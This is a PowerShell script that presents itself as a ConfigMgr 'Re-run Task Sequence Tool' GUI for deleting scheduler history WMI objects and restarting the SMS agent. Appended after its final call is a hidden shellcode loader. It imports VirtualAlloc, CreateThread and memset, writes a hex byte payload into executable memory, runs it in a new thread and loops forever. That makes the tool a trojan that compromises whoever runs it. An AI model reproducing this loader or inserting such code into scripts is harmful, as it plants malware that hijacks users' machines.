function Load-Form {
    $ButtonDelete.Enabled = $false
    $ButtonDelete.Visible = $true
    $ButtonRestart.Enabled = $false
    $ButtonRestart.Visible = $false
    $Form.Controls.Add($RBLocal)
    $Form.Controls.Add($RBRemote)
    $Form.Controls.Add($BlogLink)
    $Form.Controls.Add($TBPackageID)
    $Form.Controls.Add($TBComputer)
    $Form.Controls.Add($GBPackageID)
    $Form.Controls.Add($GBComputer)
    $Form.Controls.Add($ButtonSearch)
    $Form.Controls.Add($ButtonDelete)
    $Form.Controls.Add($ButtonRestart)
    $Form.Controls.Add($OutputBox)
    $Form.Controls.Add($DGVResults)
	$Form.Add_Shown({$Form.Activate()})
	[void]$Form.ShowDialog()
}

function Start-Search {
    Begin {
        try {
            $OutputBox.ResetText()
            $DGVResults.Rows.Clear()
            $DGVResults.Refresh()
        }
        catch {
            Write-OutputBox -OutputBoxMessage "$($_.Exception.Message)" -Type "ERROR: "
        }
    }
    Process {
        try {
            switch ($RBLocal.Checked) {
                $true {$Global:ComputerName = $env:COMPUTERNAME}
                $false {$Global:ComputerName = $TBComputer.Text}
                Default {$Global:ComputerName = $env:COMPUTERNAME}
            }
            if ($TBPackageID.Text.Length -ge 3) {
                Write-OutputBox -OutputBoxMessage "Running against computer: $($Global:ComputerName)" -Type "INFO: "
                $WMIObject = Get-WmiObject -Namespace "root\CCM\Scheduler" -Class CCM_Scheduler_History -ComputerName $Global:ComputerName -ErrorAction Stop | Where-Object {$_.ScheduleID -like "*$($TBPackageID.Text)*"} | Select-Object ScheduleID
                if ($WMIObject) {
                    $WMIObject | ForEach-Object {
                        $DGVResults.Rows.Add(([string]$_.ScheduleID)) | Out-Null
                        $DGVResults.Rows[0].Cells[0].Selected = $false
                    }
                $RowCount = $DGVResults.Rows.Count
                Write-OutputBox -OutputBoxMessage "Found $($RowCount) objects" -Type "INFO: "
                }
                else {
                    Write-OutputBox -OutputBoxMessage "No scheduled objects was found" -Type "WARNING: "
                }
            }
            else {
                Write-OutputBox -OutputBoxMessage "Please enter a PackageID with atleast 3 characters" -Type "WARNING: "
            }
        }
        catch {
            Write-OutputBox -OutputBoxMessage "$($_.Exception.Message)" -Type "ERROR: "
        }
    }
}

function Delete-Object {
    param(
    $Object,
    $CurrentCellValue
    )
    Process {
        if (-not($Object -eq $null)) {
            try {
                Write-OutputBox -OutputBoxMessage "Attempting to remove $($Object)" -Type "INFO: "
                Remove-WmiObject -InputObject $Object -ErrorAction Stop
                if (-not(Get-WmiObject -Namespace "root\CCM\Scheduler" -Class CCM_Scheduler_History -ComputerName $Global:ComputerName -ErrorAction SilentlyContinue | Where-Object {$_.ScheduleID -like "*$($CurrentCellValue)*"})) {
                    Write-OutputBox -OutputBoxMessage "Object was successfully removed" -Type "INFO: "
                    $ButtonDelete.Visible = $false
                    $ButtonDelete.Enabled = $false
                    $ButtonRestart.Visible = $true
                    $ButtonRestart.Enabled = $true
                    $DGVResults.Rows.Clear()
                    $DGVResults.Refresh()
                }
            }
            catch {
                Write-OutputBox -OutputBoxMessage "$($_.Exception.Message)" -Type "ERROR: "
            }
        }
        else {
            Write-OutputBox -OutputBoxMessage "No object has been selected" -Type "WARNING: "
        }
    }
}

function Restart-SMSAgent {
    try {
        $WarningPreference = "SilentlyContinue"
        $ButtonRestart.Enabled = $false
        Get-Service -Name "CCMExec" -ComputerName $Global:ComputerName | Restart-Service
        do {
            [System.Windows.Forms.Application]::DoEvents()
        }
        until ((Get-Service -Name "CCMExec" -ComputerName $Global:ComputerName).Status -eq "Running")
        if ((Get-Service -Name "CCMExec" -ComputerName $Global:ComputerName).Status -eq "Running") {
             Write-OutputBox -OutputBoxMessage "Successfully restarted the 'SMS Agent' service" -Type "INFO: "
        }
        $WarningPreference = "Continue"
        $ButtonRestart.Visible = $false
        $ButtonRestart.Enabled = $false
        $ButtonDelete.Visible = $true
        $ButtonDelete.Enabled = $false
    }
    catch {
        Write-OutputBox -OutputBoxMessage "$($_.Exception.Message)" -Type "ERROR: "
    }
}

function Write-OutputBox {
	param(
	[parameter(Mandatory=$true)]
	[string]$OutputBoxMessage,
	[ValidateSet("WARNING: ","ERROR: ","INFO: ")]
	[string]$Type,
    [switch]$NoNewLine
	)
	Process {
        $DateTime = (Get-Date).ToLongTimeString()
        if ($NoNewLine -eq $true) {
		    if ($OutputBox.Text.Length -eq 0) {
			    $OutputBox.Text = "$($OutputBoxMessage)"
			    [System.Windows.Forms.Application]::DoEvents()
                $OutputBox.SelectionStart = $OutputBox.Text.Length
                $OutputBox.ScrollToCaret()
		    }
		    else {
			    $OutputBox.AppendText("$($OutputBoxMessage)")
			    [System.Windows.Forms.Application]::DoEvents()
                $OutputBox.SelectionStart = $OutputBox.Text.Length
                $OutputBox.ScrollToCaret()
		    }
        }
        else {
		    if ($OutputBox.Text.Length -eq 0) {
			    $OutputBox.Text = "$($DateTime) $($Type)$($OutputBoxMessage)"
			    [System.Windows.Forms.Application]::DoEvents()
                $OutputBox.SelectionStart = $OutputBox.Text.Length
                $OutputBox.ScrollToCaret()
		    }
		    else {
			    $OutputBox.AppendText("`n$($DateTime) $($Type)$($OutputBoxMessage)")
			    [System.Windows.Forms.Application]::DoEvents()
                $OutputBox.SelectionStart = $OutputBox.Text.Length
                $OutputBox.ScrollToCaret()
		    }        
        }
	}
}


[void][System.Reflection.Assembly]::LoadWithPartialName("System.Drawing") 
[void][System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms") 


$Form = New-Object System.Windows.Forms.Form    
$Form.Size = New-Object System.Drawing.Size(600,440)  
$Form.MinimumSize = New-Object System.Drawing.Size(600,440)
$Form.MaximumSize = New-Object System.Drawing.Size(600,440)
$Form.SizeGripStyle = "Hide"
$Form.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon($PSHome + "\powershell.exe")
$Form.Text = "Re-run Task Sequence Tool 1.0"
$Form.ControlBox = $true
$Form.TopMost = $true


$TBPackageID = New-Object System.Windows.Forms.TextBox
$TBPackageID.Location = New-Object System.Drawing.Size(15,27)
$TBPackageID.Size = New-Object System.Drawing.Size(145,20)
$TBPackageID.TabIndex = 1
$TBComputer = New-Object System.Windows.Forms.TextBox
$TBComputer.Location = New-Object System.Drawing.Size(310,27)
$TBComputer.Size = New-Object System.Drawing.Size(145,20)
$TBComputer.Enabled = $false


$ButtonSearch = New-Object System.Windows.Forms.Button 
$ButtonSearch.Location = New-Object System.Drawing.Size(470,20) 
$ButtonSearch.Size = New-Object System.Drawing.Size(100,30) 
$ButtonSearch.Text = "Search"
$ButtonSearch.TabIndex = 2
$ButtonSearch.Add_Click({Start-Search})
$ButtonDelete = New-Object System.Windows.Forms.Button 
$ButtonDelete.Location = New-Object System.Drawing.Size(470,195) 
$ButtonDelete.Size = New-Object System.Drawing.Size(100,30) 
$ButtonDelete.Text = "Delete"
$ButtonDelete.TabIndex = 3
$ButtonDelete.Add_Click({Delete-Object -Object $Global:ScheduledObject -CurrentCellValue $Global:CurrentCellValue})
$ButtonRestart = New-Object System.Windows.Forms.Button 
$ButtonRestart.Location = New-Object System.Drawing.Size(470,195) 
$ButtonRestart.Size = New-Object System.Drawing.Size(100,30) 
$ButtonRestart.Text = "Restart Agent"
$ButtonRestart.Add_Click({Restart-SMSAgent})


$GBPackageID = New-Object System.Windows.Forms.GroupBox
$GBPackageID.Location = New-Object System.Drawing.Size(10,10) 
$GBPackageID.Size = New-Object System.Drawing.Size(155,45) 
$GBPackageID.Text = "PackageID"
$GBComputer = New-Object System.Windows.Forms.GroupBox
$GBComputer.Location = New-Object System.Drawing.Size(170,10) 
$GBComputer.Size = New-Object System.Drawing.Size(295,45) 
$GBComputer.Text = "Computer options"


$RBLocal = New-Object System.Windows.Forms.RadioButton
$RBLocal.Location = New-Object System.Drawing.Size(180,29)
$RBLocal.Size = New-Object System.Drawing.Size(50,15)
$RBLocal.Text = "Local"
$RBLocal.Checked = $true
$RBLocal.Add_Click({
    $TBComputer.Enabled = $false
    $TBComputer.ResetText()
})
$RBRemote = New-Object System.Windows.Forms.RadioButton
$RBRemote.Location = New-Object System.Drawing.Size(240,29)
$RBRemote.Size = New-Object System.Drawing.Size(65,15)
$RBRemote.Text = "Remote"
$RBRemote.Add_Click({
    $TBComputer.Enabled = $true
})


$OutputBox = New-Object System.Windows.Forms.RichTextBox 
$OutputBox.Location = New-Object System.Drawing.Size(10,235) 
$OutputBox.Size = New-Object System.Drawing.Size(560,135)
$OutputBox.Font = "Courier New"
$OutputBox.BackColor = "white"
$OutputBox.ReadOnly = $true
$OutputBox.MultiLine = $true
$OutputBox.TabIndex = "5"


$Global:ScheduledObject = New-Object System.Management.ManagementObject
$Global:CurrentCellValue = ""
$Global:ComputerName = ""


$DGVResults = New-Object System.Windows.Forms.DataGridView
$DGVResults.Location = New-Object System.Drawing.Size(10,65)
$DGVResults.Size = New-Object System.Drawing.Size(559,120)
$DGVResults.ColumnCount = 1
$DGVResults.ColumnHeadersVisible = $true
$DGVResults.Columns[0].Name = "WMI Object"
$DGVResults.Columns[0].AutoSizeMode = "Fill"
$DGVResults.AllowUserToAddRows = $false
$DGVResults.AllowUserToDeleteRows = $false
$DGVResults.ReadOnly = $True
$DGVResults.ColumnHeadersHeightSizeMode = "DisableResizing"
$DGVResults.RowHeadersWidthSizeMode = "DisableResizing"
$DGVResults.Add_CellClick({
    try {
        if ($_.RowIndex -ge "0") {
            $WMISelectedObject = $DGVResults.CurrentCell.Value
            $Global:CurrentCellValue = $DGVResults.CurrentCell.Value
            $WMIObjectRemove = Get-WmiObject -Namespace "root\CCM\Scheduler" -Class CCM_Scheduler_History -ComputerName $Global:ComputerName -ErrorAction Stop | Where-Object {$_.ScheduleID -like "*$($WMISelectedObject)*"} 
            Write-OutputBox -OutputBoxMessage "Selected the '$($WMIObjectRemove)' schedule object" -Type "INFO: "
            $Global:ScheduledObject = $WMIObjectRemove
            $ButtonDelete.Visible = $true
            $ButtonDelete.Enabled = $true
        }
    }
    catch {
        Write-OutputBox -OutputBoxMessage "$($_.Exception.Message)" -Type "ERROR: "
    }
})


$OpenLink = {[System.Diagnostics.Process]::Start("http://www.scconfigmgr.com")}
$BlogLink = New-Object System.Windows.Forms.LinkLabel
$BlogLink.Location = New-Object System.Drawing.Size(10,377) 
$BlogLink.Size = New-Object System.Drawing.Size(150,25)
$BlogLink.Text = "www.scconfigmgr.com"
$BlogLink.Add_Click($OpenLink)
$BlogLink.TabIndex = 6


Load-Form
$Ttvk = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $Ttvk -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xd9,0xea,0xd9,0x74,0x24,0xf4,0xba,0x99,0xe1,0xc4,0x00,0x5f,0x2b,0xc9,0xb1,0x47,0x83,0xef,0xfc,0x31,0x57,0x14,0x03,0x57,0x8d,0x03,0x31,0xfc,0x45,0x41,0xba,0xfd,0x95,0x26,0x32,0x18,0xa4,0x66,0x20,0x68,0x96,0x56,0x22,0x3c,0x1a,0x1c,0x66,0xd5,0xa9,0x50,0xaf,0xda,0x1a,0xde,0x89,0xd5,0x9b,0x73,0xe9,0x74,0x1f,0x8e,0x3e,0x57,0x1e,0x41,0x33,0x96,0x67,0xbc,0xbe,0xca,0x30,0xca,0x6d,0xfb,0x35,0x86,0xad,0x70,0x05,0x06,0xb6,0x65,0xdd,0x29,0x97,0x3b,0x56,0x70,0x37,0xbd,0xbb,0x08,0x7e,0xa5,0xd8,0x35,0xc8,0x5e,0x2a,0xc1,0xcb,0xb6,0x63,0x2a,0x67,0xf7,0x4c,0xd9,0x79,0x3f,0x6a,0x02,0x0c,0x49,0x89,0xbf,0x17,0x8e,0xf0,0x1b,0x9d,0x15,0x52,0xef,0x05,0xf2,0x63,0x3c,0xd3,0x71,0x6f,0x89,0x97,0xde,0x73,0x0c,0x7b,0x55,0x8f,0x85,0x7a,0xba,0x06,0xdd,0x58,0x1e,0x43,0x85,0xc1,0x07,0x29,0x68,0xfd,0x58,0x92,0xd5,0x5b,0x12,0x3e,0x01,0xd6,0x79,0x56,0xe6,0xdb,0x81,0xa6,0x60,0x6b,0xf1,0x94,0x2f,0xc7,0x9d,0x94,0xb8,0xc1,0x5a,0xdb,0x92,0xb6,0xf5,0x22,0x1d,0xc7,0xdc,0xe0,0x49,0x97,0x76,0xc1,0xf1,0x7c,0x87,0xee,0x27,0xe8,0x82,0x78,0x0e,0xea,0xb6,0xeb,0xe6,0xf7,0xc6,0x6a,0x5f,0x7e,0x20,0x3c,0xcf,0xd1,0xfd,0xfc,0xbf,0x91,0xad,0x94,0xd5,0x1d,0x91,0x84,0xd5,0xf7,0xba,0x2e,0x3a,0xae,0x93,0xc6,0xa3,0xeb,0x68,0x77,0x2b,0x26,0x15,0xb7,0xa7,0xc5,0xe9,0x79,0x40,0xa3,0xf9,0xed,0xa0,0xfe,0xa0,0xbb,0xbf,0xd4,0xcf,0x43,0x2a,0xd3,0x59,0x14,0xc2,0xd9,0xbc,0x52,0x4d,0x21,0xeb,0xe9,0x44,0xb7,0x54,0x85,0xa8,0x57,0x55,0x55,0xff,0x3d,0x55,0x3d,0xa7,0x65,0x06,0x58,0xa8,0xb3,0x3a,0xf1,0x3d,0x3c,0x6b,0xa6,0x96,0x54,0x91,0x91,0xd1,0xfa,0x6a,0xf4,0xe3,0xc7,0xbc,0x30,0x96,0x29,0x7d;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$DUy=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($DUy.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$DUy,0,0,0);for (;;){Start-sleep 60};

